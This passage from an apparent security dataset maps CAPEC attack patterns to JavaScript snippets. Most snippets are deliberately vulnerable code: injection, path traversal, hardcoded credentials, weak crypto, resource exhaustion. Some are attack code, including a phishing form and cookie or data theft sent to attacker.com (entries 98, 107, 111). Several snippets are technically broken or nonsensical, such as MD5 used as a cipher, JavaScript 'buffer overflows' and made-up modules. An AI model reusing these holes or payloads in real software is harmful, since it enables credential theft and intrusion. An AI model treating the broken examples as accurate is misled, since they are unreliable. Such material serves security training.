        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (MD5)\nfunction encryptMD5(plaintext, key) {\n  const cipher = crypto.createCipher('md5', key);\n  return cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');\n}\n\n// CWE-1204: Generating a weak Initialization Vector (IV)\nfunction generateWeakIV() {\n  return '0000000000000000'; // Using a fixed and predictable IV\n}\n\n// CWE-1240: Using a non-standard cryptographic implementation\nfunction customEncrypt(plaintext, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key, generateWeakIV());\n  return cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex');\n}\n\n// CWE-1241: Using a predictable algorithm in a random number generator\nfunction predictableRandomNumber() {\n  return Math.floor(Date.now() / 1000); // Using a predictable timestamp-based random number\n}\n\n// CWE-1279: Performing cryptographic operations before supporting units are ready\nfunction encryptBeforeReady(plaintext, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  return cipher.update(plaintext, 'utf8', 'hex') + cipher.final('hex'); // Using an uninitialized IV\n}\n",
        "description": "This code snippet demonstrates various cryptographic weaknesses, including the use of a broken algorithm (MD5), a weak Initialization Vector (IV), a non-standard cryptographic implementation, a predictable random number generator, and performing cryptographic operations before supporting units are ready. These weaknesses can be exploited by an attacker to compromise the cryptographic result."
    },
    {
        "capec_id": "98",
        "code_snippet": "const phishingPage = `<html><body><h1>Login Page</h1><form action='https://attacker.com/stealCredentials'><label>Username: <input type='text' name='username'/></label><br><label>Password: <input type='password' name='password'/></label><br><input type='submit' value='Login'/></form></body></html>`;\n\nconst maliciousURL = 'https://attacker.com/phishingPage';\n\nfunction redirectUser(url) {\n  window.location.href = url;\n}\n\nfunction stealCredentials() {\n  const username = document.getElementsByName('username')[0].value;\n  const password = document.getElementsByName('password')[0].value;\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://attacker.com/stealCredentials', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send(`username=${username}&password=${password}`);\n}\n\nredirectUser(maliciousURL);\n",
        "description": "This JavaScript code snippet demonstrates a phishing attack. It creates a fake login page and redirects the user to it. When the user submits the form, it steals the credentials and sends them to the attacker's server using an XMLHttpRequest. This code embodies CWE-451 by misrepresenting critical information (the login page), CWE-601 by redirecting to an untrusted site, CWE-506 and CWE-507 by containing malicious code, and CWE-512 by collecting personally identifiable information without the user's explicit approval."
    },
    {
        "capec_id": "99",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xml2js = require('xml2js');\nconst parser = new xml2js.Parser();\n\napp.post('/processXml', (req, res) => {\n  const xmlData = req.body.xml;\n  parser.parseString(xmlData, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n    } else {\n      // No validation or sanitization of XML data\n      const xpath = result.xpath;\n      const xmlDoc = result.xmlDoc;\n      // Process XML data without restricting external entity references\n      const externalEntity = xmlDoc.createEntity('myEntity', 'http://example.com/external.dtd');\n      xmlDoc.documentElement.setAttribute('xmlns:xsi', 'http://www.w3.org/2001/XMLSchema-instance');\n      xmlDoc.documentElement.setAttribute('xsi:schemaLocation', 'http://example.com/mySchema.xsd');\n      res.send(`Processed XML: ${xpath}`);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable XML processing implementation in a Node.js Express application. It lacks proper XML validation and sanitization, making it susceptible to XML injection (CWE-91) and missing XML validation (CWE-112). Additionally, it does not restrict external entity references, which can lead to improper restriction of XML external entity reference (CWE-611). An attacker can exploit these weaknesses by sending a malicious XML payload to the /processXml endpoint."
    },
    {
        "capec_id": "100",
        "code_snippet": "function vulnerableFunction(userInput) {\n  var buffer = new Array(10);\n  for (var i = 0; i < userInput.length; i++) {\n    buffer[i] = userInput[i];\n  }\n  return buffer;\n}\n\n// Example usage:\nvar userInput = \"A\".repeat(20);\nvulnerableFunction(userInput);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes a user input string and copies it into a fixed-size array `buffer` without checking the size of the input. This can lead to a buffer overflow if the input string is larger than the buffer size. The example usage shows how an attacker can exploit this vulnerability by providing a long input string, causing the function to write beyond the bounds of the buffer."
    },
    {
        "capec_id": "101",
        "code_snippet": "const express = require('express');\nconst app = express();\napp.get('/vulnerable', (req, res) => {\n    const userInput = req.query.userInput;\n    const filePath = `../sensitive_files/${userInput}.txt`;\n    const ssiDirective = `<!--#include file=\"${filePath}\"-->`;\n    res.send(ssiDirective);\n});\napp.listen(3000, () => {\n    console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates SSI Injection vulnerability. The Express.js server takes user input and uses it to construct an SSI directive, which is then sent to the client. An attacker can manipulate the user input to access sensitive files or execute shell commands, exploiting the improper neutralization of server-side includes (CWE-97) and improper input validation (CWE-20). The code also relates to CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) and CWE-602 (Client-Side Enforcement of Server-Side Security) as it relies on the client to interpret the SSI directive, and CWE-433 (Unparsed Raw Web Content Delivery) as it serves raw content without proper handling."
    },
    {
        "capec_id": "102",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  res.sendFile(__dirname + '/login.html');\n});\n\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  const password = req.body.password;\n  // Unprotected transport of credentials (CWE-523)\n  res.cookie('username', username, { httpOnly: false });\n  res.cookie('password', password, { httpOnly: false });\n  res.redirect('/protected');\n});\n\napp.get('/protected', (req, res) => {\n  const username = req.cookies.username;\n  const password = req.cookies.password;\n  // Insufficiently protected credentials (CWE-522)\n  if (username === 'admin' && password === 'password') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to session sidejacking. The login credentials are transmitted in plaintext and stored in cookies without the Secure attribute, making it possible for an attacker to sniff the traffic and capture the session token. The attacker can then use the stolen token to impersonate the victim and gain unauthorized access to the protected resource."
    },
    {
        "capec_id": "103",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://attacker-controlled-domain.com/malicious-iframe';\niframe.frameBorder = '0';\niframe.width = '100%';\niframe.height = '100%';\ndocument.body.appendChild(iframe);\n\nfunction nonReentrantCode() {\n  // Non-reentrant code that performs a security-sensitive operation\n  const userInput = document.getElementById('user-input').value;\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://victim-domain.com/perform-action', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('user-input=' + userInput);\n  // Misinterpretation of input: assuming userInput is sanitized\n  const nestedCall = () => {\n    nonReentrantCode();\n  };\n  setTimeout(nestedCall, 0);\n}\n\n// Context switching race condition: switching between contexts without proper synchronization\nfunction switchContext() {\n  const contextSwitched = false;\n  setTimeout(() => {\n    contextSwitched = true;\n  }, 0);\n  if (!contextSwitched) {\n    nonReentrantCode();\n  }\n}\n\n// Improper restriction of rendered UI layers or frames\nfunction renderUI() {\n  const maliciousFrame = document.createElement('frame');\n  maliciousFrame.src = 'https://attacker-controlled-domain.com/malicious-frame';\n  document.body.appendChild(maliciousFrame);\n}\n\nrenderUI();",
        "description": "This code snippet demonstrates a JavaScript-based attack that tricks a victim into unknowingly initiating an action in one system while interacting with the UI from a seemingly completely different system. It uses an iframe to load malicious content from an attacker-controlled domain, which can lead to user confusion about which interface the user is interacting with (CWE-1021). The code also contains a non-reentrant function that performs a security-sensitive operation, which can be invoked recursively through a nested call, leading to unintended reentrant invocation of non-reentrant code (CWE-1265). Additionally, the code has a context switching race condition that allows an attacker to modify or misrepresent the product's behavior during the switch (CWE-368). Furthermore, the code misinterprets user input, assuming it is sanitized, which can lead to security vulnerabilities (CWE-115). Finally, the code contains embedded malicious code that appears to be malicious in nature (CWE-506)."
    },
    {
        "capec_id": "104",
        "code_snippet": "function loadContent(url) {\n\tvar iframe = document.createElement('iframe');\n\tiframe.src = url;\n\tiframe.frameBorder = '0';\n\tiframe.width = '100%';\n\tiframe.height = '100%';\n\tdocument.body.appendChild(iframe);\n}\n\nfunction executeScript() {\n\tvar script = document.createElement('script');\n\tscript.src = 'https://example.com/maliciousScript.js';\n\tdocument.body.appendChild(script);\n}\n\nloadContent('https://example.com/maliciousContent.html');\nexecuteScript();",
        "description": "JavaScript code snippet that demonstrates a privilege elevation attack by loading malicious content into an iframe and executing a script with elevated privileges, bypassing security zone controls. This code embodies CWE-250 (Execution with Unnecessary Privileges), CWE-638 (Not Using Complete Mediation), CWE-285 (Improper Authorization), CWE-116 (Improper Encoding or Escaping of Output), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "105",
        "code_snippet": "const http = require('http');\nconst proxy = http.createServer((req, res) => {\n  const maliciousReq = 'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: example.com\\r\\n';\n  const options = {\n    host: 'example.com',\n    port: 80,\n    method: 'GET',\n    headers: {\n      'Content-Length': maliciousReq.length\n    }\n  };\n  const proxyReq = http.request(options, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n  proxyReq.write(maliciousReq);\n  proxyReq.end();\n});\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This code snippet demonstrates HTTP Request Smuggling (CAPEC-110) by exploiting inconsistencies in HTTP request interpretation between a proxy server and a backend server. The proxy server receives a malicious request with a crafted 'Content-Length' header, which is then forwarded to the backend server. The backend server may interpret the request differently, potentially leading to unauthorized access or data tampering. CWE-74, CWE-113, CWE-138, CWE-436, and CWE-444 are related to this vulnerability."
    },
    {
        "capec_id": "106",
        "code_snippet": "var userInput = '<script>alert(\"XSS\")</script>'; document.write('<img src=\"' + userInput + '\" />');",
        "description": "This code snippet demonstrates a Cross-Site Scripting (XSS) vulnerability, which can occur when user input is not properly sanitized. The userInput variable contains malicious script, which is then injected into the HTML IMG tag's src attribute, allowing the script to execute. This is an example of CWE-79: Improper Neutralization of Input During Web Page Generation and CWE-82: Improper Neutralization of Script in Attributes of IMG Tags in a Web Page."
    },
    {
        "capec_id": "107",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('TRACE', 'https://example.com', true);\nxhr.setRequestHeader('Max-Forwards', '10');\nxhr.send();\n\nconst xhr2 = new XMLHttpRequest();\nxhr2.open('GET', 'https://example.com', true);\nxhr2.onreadystatechange = function() {\n  if (xhr2.readyState === 4) {\n    const response = xhr2.responseText;\n    const cookie = xhr2.getResponseHeader('Set-Cookie');\n    const xhr3 = new XMLHttpRequest();\n    xhr3.open('GET', 'https://attacker.com/stealCookie', true);\n    xhr3.setRequestHeader('Cookie', cookie);\n    xhr3.send();\n  }\n};\nxhr2.send();",
        "description": "This code snippet demonstrates a Cross-Site Tracing (XST) attack, which can be used to steal a user's session cookie. The code sends a TRACE request to the vulnerable server, which responds with the user's cookie. The cookie is then sent to the attacker's server. This code exploits CWE-693 (Protection Mechanism Failure), CWE-648 (Incorrect Use of Privileged APIs), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-352 (Cross-Site Request Forgery), and CWE-692 (Incomplete Denylist to Cross-Site Scripting)."
    },
    {
        "capec_id": "108",
        "code_snippet": "const mysql = require('mysql');\nconst exec = require('child_process').exec;\n\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password',\n  database: 'mydb'\n});\n\napp.get('/inject', (req, res) => {\n  const userInput = req.query.input;\n  const query = `INSERT INTO commands (command) VALUES ('${userInput}');`;\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n    } else {\n      res.send('Command injected successfully');\n    }\n  });\n});\n\napp.get('/execute', (req, res) => {\n  const query = 'SELECT command FROM commands';\n  db.query(query, (err, results) => {\n    if (err) {\n      console.error(err);\n    } else {\n      const command = results[0].command;\n      exec(command, (err, stdout, stderr) => {\n        if (err) {\n          console.error(err);\n        } else {\n          res.send(stdout);\n        }\n      });\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable application that is susceptible to SQL injection and OS command injection. The /inject endpoint injects user input into a database without proper validation, and the /execute endpoint fetches the injected data and executes it as a shell command without proper validation, allowing an attacker to inject malicious commands."
    },
    {
        "capec_id": "109",
        "code_snippet": "const Hibernate = require('hibernate');\nconst sessionFactory = Hibernate.SessionFactory;\nconst session = sessionFactory.getCurrentSession();\n\nconst userInput = req.query.username;\nconst hql = `FROM User WHERE username = '${userInput}'`;\n\nsession.createQuery(hql).list();",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that uses Hibernate to execute a dynamic SQL statement built with user-controlled input. The input is not properly validated or sanitized, allowing an attacker to inject malicious SQL commands. This code is vulnerable to SQL injection (CWE-89, CWE-564) due to improper input validation (CWE-20) and failure to neutralize special elements in the data query logic (CWE-943)."
    },
    {
        "capec_id": "110",
        "code_snippet": "const soap = require('soap');\nconst mysql = require('mysql');\n\nconst service = {\n  getCustomer: function(args, callback) {\n    const conn = mysql.createConnection({\n      host: 'localhost',\n      user: 'root',\n      password: 'password',\n      database: 'mydb'\n    });\n\n    conn.connect(function(err) {\n      if (err) {\n        console.error('error connecting:', err);\n        throw err;\n      }\n      console.log('connected as id ' + conn.threadId);\n\n      const query = `SELECT * FROM customers WHERE name = '${args.name}'`;\n      conn.query(query, function(err, rows) {\n        if (err) {\n          console.log('error running query:', err);\n          callback(err, null);\n        } else {\n          callback(null, rows);\n        }\n      });\n    });\n  }\n};\n\nconst xml = `<?xml version='1.0' encoding='UTF-8'?><SOAP-ENV:Envelope xmlns:SOAP-ENV='http://www.w3.org/2003/05/soap-envelope/'><SOAP-ENV:Body><m:getCustomer><m:name>Robert'); DROP TABLE customers; --</m:name></m:getCustomer></SOAP-ENV:Body></SOAP-ENV:Envelope>`;\n\nconst soapServer = new soap.HTTPServer(service, 8080, '/soap', false);\nsoapServer.listen();",
        "description": "This code snippet demonstrates a SQL injection vulnerability in a SOAP service. The service receives a SOAP request with a customer name, constructs a SQL query using the input, and executes it without proper validation or parameter binding. An attacker can modify the SOAP request to inject malicious SQL code, such as dropping a table. The code uses the 'soap' and 'mysql' packages in Node.js."
    },
    {
        "capec_id": "111",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/data.json', true); xhr.onload = function() { if (xhr.status === 200) { const resp = JSON.parse(xhr.responseText); const scriptTag = document.createElement('script'); scriptTag.src = 'https://attacker.com/stealData?data=' + encodeURIComponent(resp.confidentialInfo); document.body.appendChild(scriptTag); } }; xhr.send();",
        "description": "This code snippet demonstrates a JSON hijacking vulnerability. It makes a GET request to a server to retrieve a JSON object containing confidential information. The response is then parsed and the confidential information is sent to the attacker's server by dynamically creating a script tag with the src attribute set to the attacker's server. This exploits the Same Origin Policy loophole, allowing the attacker to steal sensitive data."
    },
    {
        "capec_id": "112",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'admin': 'password123',\n  'user1': 'ilovecats',\n  'user2': 'letmein'\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to brute force attacks. The passwords are stored in plaintext and there is no rate limiting or IP blocking for failed login attempts, making it vulnerable to CWE-307. The passwords themselves are also weak, violating CWE-521. Additionally, the use of a simple dictionary to store passwords makes it vulnerable to CWE-330, as an attacker could potentially guess the passwords using a dictionary attack. Furthermore, the lack of encryption for password storage and transmission makes it vulnerable to CWE-326. Finally, the authentication mechanism does not sufficiently prove the claimed identity, making it vulnerable to CWE-1390."
    },
    {
        "capec_id": "113",
        "code_snippet": "const ioctl = require('ioctl');\n\n// CWE-782: Exposed IOCTL with Insufficient Access Control\nconst restrictedFunctionality = ioctl.getIoctl('restricted_function');\nrestrictedFunctionality.execute(); // No access control checks\n\n// CWE-1262: Improper Access Control for Register Interface\nconst registerInterface = require('register_interface');\nregisterInterface.writeRegister(0x1234, 0x5678); // No access control checks\n\n// CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nconst shadowRegisters = require('shadow_registers');\nshadowRegisters.writeRegister(0x9012, 0x3456); // No protection mechanism\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugLogic = require('debug_logic');\ndebugLogic.activate(); // Activates test/debug logic at runtime\n\n// CWE-1192: Improper Identifier for IP Block used in System-On-Chip (SOC)\nconst soc = require('soc');\nsoc.getComponent('non_unique_identifier').execute(); // No unique identifier",
        "description": "This code snippet demonstrates the CAPEC of interface manipulation, where an adversary can bypass access control and execute unintended functionality. It includes examples of CWE-782 (exposed IOCTL with insufficient access control), CWE-1262 (improper access control for register interface), CWE-1299 (missing protection mechanism for alternate hardware interface), CWE-1313 (hardware allows activation of test or debug logic at runtime), and CWE-1192 (improper identifier for IP block used in System-on-Chip)."
    },
    {
        "capec_id": "114",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst debugMode = true;\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (debugMode) {\n    // CWE-1244: Internal Asset Exposed to Unsafe Debug Access Level or State\n    if (username === 'debug_user' && password === 'debug_password') {\n      res.send({ authenticated: true });\n      return;\n    }\n  }\n  // CWE-287: Improper Authentication\n  if (username === 'admin' && password.length > 5) {\n    res.send({ authenticated: true });\n  } else {\n    res.send({ authenticated: false });\n  }\n});\n\napp.post('/api/data', (req, res) => {\n  // CWE-307: Improper Restriction of Excessive Authentication Attempts\n  if (req.body.authenticated) {\n    res.send({ data: 'sensitive_data' });\n  } else {\n    res.send({ error: 'unauthorized' });\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism in a Node.js Express application. The code has multiple weaknesses, including improper authentication (CWE-287), internal asset exposed to unsafe debug access level or state (CWE-1244), and improper restriction of excessive authentication attempts (CWE-307). An attacker can exploit these weaknesses to gain unauthorized access to the application and retrieve sensitive data."
    },
    {
        "capec_id": "115",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  if (req.query.admin === 'true') {\n    // Assume the user is an admin if the query parameter is set\n    res.send('Welcome, admin!');\n  } else {\n    res.send('Access denied.');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates an authentication bypass vulnerability. The /admin endpoint checks for a query parameter 'admin' to be set to 'true' to grant access. An attacker can bypass authentication by simply adding the query parameter, allowing them to access protected data without proper authentication."
    },
    {
        "capec_id": "116",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getSensitiveInfo(debugMode) {\n    if (debugMode) {\n        const fusePath = path.join(__dirname, 'fuses');\n        const fuseContent = fs.readFileSync(fusePath, 'utf8');\n        console.log(fuseContent);\n    }\n}\n\nfunction searchForResources(searchPath) {\n    const resources = fs.readdirSync(searchPath);\n    for (const resource of resources) {\n        if (resource.endsWith('.exe')) {\n            const virus = require(path.join(searchPath, resource));\n            virus.replicate();\n        }\n    }\n}\n\nfunction createEmergentResource() {\n    const emergentResource = fs.createWriteStream('emergentResource.txt');\n    emergentResource.write('This is an emergent resource');\n    emergentResource.end();\n}\n\ngetSensitiveInfo(true);\nsearchForResources('untrustedPath');\ncreateEmergentResource();",
        "description": "This code snippet demonstrates the CAPEC of actively probing the target to solicit information for malicious purposes. It includes CWE-200 by exposing sensitive information in debug mode, CWE-1243 by not protecting security-sensitive information stored in fuses during debug, CWE-509 by replicating malicious code, CWE-426 by searching for critical resources using an externally-supplied search path, and CWE-1229 by creating an emergent resource that can be used by attackers."
    },
    {
        "capec_id": "117",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = 'username:password';\n  res.send(sensitiveInfo);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web server that transmits sensitive information in cleartext (CWE-319) over an insecure channel. An adversary can sniff the network traffic to gather sensitive information. The code does not implement any encryption or secure protocol to protect the data in transit. Additionally, it does not validate or ensure the integrity of the message during transmission (CWE-924), making it vulnerable to tampering or modification. This code can be used as a starting point for an adversary to launch a sniffing attack (CAPEC-151) to gather sensitive information."
    },
    {
        "capec_id": "120",
        "code_snippet": "const userInput = '%252E';\nconst decodedInput = decodeURIComponent(userInput);\nconst filteredInput = filterInput(decodedInput);\nif (filteredInput === '.') {\n  // allow the request\n  console.log('Request allowed');\n} else {\n  console.log('Request blocked');\n}\n\nfunction filterInput(input) {\n  const blockedChars = ['.', '..', './', '../'];\n  if (blockedChars.includes(input)) {\n    return null;\n  } else {\n    return input;\n  }\n}",
        "description": "This code snippet demonstrates the CAPEC of double encoding to bypass filters. The userInput is doubly encoded as '%252E', which decodes to '.'. The filterInput function checks if the decoded input is in the blockedChars list, but since it only checks for '.' and not '%252E', the request is allowed. This is an example of CWE-173: Improper Handling of Alternate Encoding, CWE-172: Encoding Error, CWE-177: Improper Handling of URL Encoding (Hex Encoding), and CWE-20: Improper Input Validation."
    },
    {
        "capec_id": "121",
        "code_snippet": "const debugMode = true;\n\nif (debugMode) {\n  const securityToken = generateSecurityToken();\n  console.log(`Security Token: ${securityToken}`);\n  // Debug logic\n  const reservedBits = 0x0001;\n  const entityId = 0x1234;\n  const transaction = {\n    entityId: entityId,\n    data: 'sensitive_data',\n    securityToken: securityToken\n  };\n  processTransaction(transaction);\n  // Incorrect chaining of debug components\n  const debugComponent = {\n    debug: true,\n    log: function(message) {\n      console.log(`DEBUG: ${message}`);\n    }\n  };\n  debugComponent.log('Debug message revealing unnecessary information');\n} else {\n  // Production mode\n  console.log('Production mode. No debug logic allowed.');\n}",
        "description": "This code snippet demonstrates the CAPEC of exploiting a sample, demonstration, test, or debug interface that is unintentionally enabled on a production system. The code includes various CWEs, such as active debug code (CWE-489), failure to disable reserved bits (CWE-1209), improper restriction of security token assignment (CWE-1259), and debug messages revealing unnecessary information (CWE-1295). The code also includes incorrect chaining of debug components (CWE-1296) and missing source identifier in entity transactions on a System-On-Chip (SOC) (CWE-1302)."
    },
    {
        "capec_id": "122",
        "code_snippet": "const adminFunctions = {\n  deleteUser: (username) => {\n    // delete user from database\n    console.log(`Deleted user ${username}`);\n  },\n  viewSensitiveData: () => {\n    // return sensitive data\n    return 'Sensitive data'\n  }\n};\n\n// Assign adminFunctions to a non-privileged user\nconst nonPrivilegedUser = {\n  role: 'user',\n  permissions: adminFunctions\n};\n\n// Non-privileged user can now access admin functions\nnonPrivilegedUser.permissions.deleteUser('johnDoe');\nnonPrivilegedUser.permissions.viewSensitiveData();",
        "description": "This code snippet demonstrates improper privilege management and access control. The adminFunctions object contains sensitive functions that should only be accessible to privileged users. However, these functions are assigned to a non-privileged user, allowing them to access and execute sensitive operations."
    },
    {
        "capec_id": "123",
        "code_snippet": "function vulnerableFunction(bufferSize) {\n  var buffer = new Buffer(bufferSize);\n  var userInput = \"A\".repeat(bufferSize + 10);\n  for (var i = 0; i < userInput.length; i++) {\n    buffer[i] = userInput.charCodeAt(i);\n  }\n  return buffer.toString();\n}\n\nvulnerableFunction(10);",
        "description": "This JavaScript code snippet demonstrates a buffer overflow vulnerability. The function `vulnerableFunction` takes a `bufferSize` as an argument, creates a buffer of that size, and then attempts to fill it with user input. However, the user input is larger than the buffer size, causing a buffer overflow. The function then returns the contents of the buffer, which may include sensitive data from adjacent memory locations."
    },
    {
        "capec_id": "124",
        "code_snippet": "const sharedResource = { value: 0 }; \n\nfunction thread1() { \n  while (true) { \n    sharedResource.value += 1; \n    console.log('Thread 1: ' + sharedResource.value); \n  } \n} \n\nfunction thread2() { \n  while (true) { \n    sharedResource.value -= 1; \n    console.log('Thread 2: ' + sharedResource.value); \n  } \n} \n\nthread1(); \nthread2();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting a shared resource between multiple threads. Two threads, thread1 and thread2, access and modify a shared resource (an object with a single property 'value') concurrently without proper synchronization. This can lead to unexpected behavior, data corruption, or crashes, as described in CWE-662: Improper Synchronization. The shared resource is not isolated, allowing both threads to access and modify it simultaneously, violating the expected architecture isolation between contexts (CWE-1303). This can also lead to exposure of sensitive information in shared microarchitectural structures during transient execution (CWE-1421)."
    },
    {
        "capec_id": "125",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  let i = 0;\n  while (true) {\n    i++;\n    console.log(`Request ${i}`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a flooding attack by creating an infinite loop on the server-side when a GET request is made to the root URL. The loop consumes system resources indefinitely, making it difficult for legitimate users to access the service. This code embodies CWE-400: Uncontrolled Resource Consumption, CWE-404: Improper Resource Shutdown or Release, CWE-410: Insufficient Resource Pool, CWE-770: Allocation of Resources Without Limits or Throttling, and CWE-406: Insufficient Control of Network Message Volume (Network Amplification)."
    },
    {
        "capec_id": "126",
        "code_snippet": "const fs = require('fs');\n\nfunction getFile(file) {\n  const filePath = `./uploads/${file}`;\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      console.log(data);\n    }\n  });\n}\n\n// Vulnerable usage:\ngetFile('../secret.txt');\ngetFile('/../../../../etc/passwd');",
        "description": "This code snippet demonstrates a path traversal vulnerability in a Node.js application. The `getFile` function takes a file name as input and attempts to read the file from the `./uploads/` directory. However, the function does not properly validate the input file name, allowing an attacker to traverse out of the intended directory structure using dot-dot-slash characters. By providing a malicious file name, such as `../secret.txt` or `/../../../../etc/passwd`, an attacker can access sensitive files outside of the restricted directory."
    },
    {
        "capec_id": "127",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/:path*', (req, res) => {\n  const path = req.params.path;\n  const fs = require('fs');\n  const dir = './' + path;\n  fs.readdir(dir, (err, files) => {\n    if (err) {\n      res.status(404).send({ error: 'Directory not found' });\n    } else {\n      res.json(files);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet is an example of a vulnerable Express.js server that allows an attacker to list the contents of a directory by making a GET request to the directory path. The server does not perform any authorization checks, allowing an attacker to browse the directory tree and access sensitive files. This code embodies CWE-425 (Direct Request ('Forced Browsing')), CWE-285 (Improper Authorization), and CWE-693 (Protection Mechanism Failure)."
    },
    {
        "capec_id": "128",
        "code_snippet": "function validateAndProcessInput(input) {\n  if (input <= MAX_INT) {\n    input += 1;\n    if (input < 0) {\n      // Perform security-critical action\n      console.log('Access granted');\n    } else {\n      console.log('Access denied');\n    }\n  }\n}\n\nconst MAX_INT = 2147483647;\nvalidateAndProcessInput(MAX_INT);",
        "description": "This code snippet demonstrates the CAPEC of exploiting the structure of integer variables. The function validateAndProcessInput checks if the input is less than or equal to the maximum integer value (MAX_INT). If true, it increments the input by 1, which causes an integer overflow and wraps around to a negative number. The code then checks if the resulting value is less than 0, and if so, performs a security-critical action (granting access). This vulnerability is related to CWE-682 (Incorrect Calculation), CWE-839 (Numeric Range Comparison Without Minimum Check), CWE-190 (Integer Overflow or Wraparound), CWE-194 (Unexpected Sign Extension), and CWE-192 (Integer Coercion Error)."
    },
    {
        "capec_id": "129",
        "code_snippet": "function vulnerableFunction(buffer) {\n  var ptr = buffer + 10; // CWE-823: Use of Out-of-range Pointer Offset\n  var data = ptr * 2; // CWE-682: Incorrect Calculation\n  if (data > 0) {\n    var untrustedValue = getUserInput(); // CWE-822: Untrusted Pointer Dereference\n    ptr = untrustedValue;\n    var result = ptr[0]; // CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n    if (result === null) {\n      ptr = null; // CWE-476: NULL Pointer Dereference\n    }\n    console.log(result);\n  }\n}\n",
        "description": "This JavaScript code snippet demonstrates a pointer attack by manipulating a pointer to access unintended memory locations, leading to potential crashes, data access, or arbitrary code execution."
    },
    {
        "capec_id": "130",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  let arr = [];\n  while (true) {\n    arr.push(new Array(1000000).join('x'));\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a denial-of-service attack by allocating excessive memory resources to service a single request. The while loop continuously allocates large arrays, causing the server to consume increasing amounts of memory, eventually leading to resource exhaustion. This code embodies CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-400 (Uncontrolled Resource Consumption), which are related to the CAPEC description."
    },
    {
        "capec_id": "131",
        "code_snippet": "let connections = [];\n\nfunction createConnection() {\n  let conn = new WebSocket('ws://example.com');\n  connections.push(conn);\n  // No mechanism to close or release the connection when it's no longer needed\n}\n\nsetInterval(createConnection, 1000);\n",
        "description": "This code snippet demonstrates a resource leak vulnerability. It creates a new WebSocket connection every second and stores it in an array, but never closes or releases the connection when it's no longer needed. This can lead to a depletion of system resources, such as memory and file descriptors, causing the system to become unresponsive or crash."
    },
    {
        "capec_id": "132",
        "code_snippet": "const fs = require('fs');\n\nfunction readFile(file) {\n  if (fs.existsSync(file)) {\n    fs.readFile(file, 'utf8', (err, data) => {\n      if (err) {\n        console.error(err);\n      } else {\n        console.log(data);\n      }\n    });\n  }\n}\n\n// attacker creates a symbolic link to a sensitive file\nfs.symlink('/etc/passwd', 'userfile', (err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    // legitimate user accesses the file\n    readFile('userfile');\n  }\n});",
